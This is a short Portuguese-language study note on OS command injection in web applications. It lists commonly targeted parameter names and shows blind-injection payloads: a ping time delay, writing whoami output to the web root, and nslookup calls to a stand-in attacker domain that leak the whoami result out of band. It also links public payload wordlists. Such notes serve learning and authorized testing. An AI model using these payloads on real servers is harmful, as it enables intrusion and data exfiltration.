#web #api #vuln

**Shell injection** ou **command injection** permite o hacker enviar comandos de sistema no servidor que está rodando a aplicação.

O comum deste ataque é injetar payloads em parâmetros:

```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

## Blind CI

Algumas aplicações não te da retorno do ataque realizado, mas ainda podem ser exploradas. 

### Time relays

Uma das formas de explorar isso é através de *time delays*.

Você pode enviar comandos com atraso de tempo com o `ping` pois é possível especificar o número de pacotes ICMP que vão ser enviados.

```sh
& ping -c 10 127.0.0.1 &
```

### Redirecionar output

Outro teste é redirecionar o output para o caminho raiz da aplicação web. Por exemplo, deduzindo que a aplicação está rodando em `/var/www/html:

```sh
& whoami > /var/www/html/whoami.txt &
```

### Técnicas out-of-band

Vocẽ pode enviar comandos que realizem uma interação de rede fora de banda e monitorar isso:

```bash
& nslookup kgji2ohoyw.web-attacker.com &
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

## Payloads

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection/Intruder

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt

## Referências

https://portswigger.net/web-security/os-command-injection
https://book.hacktricks.xyz/pentesting-web/command-injection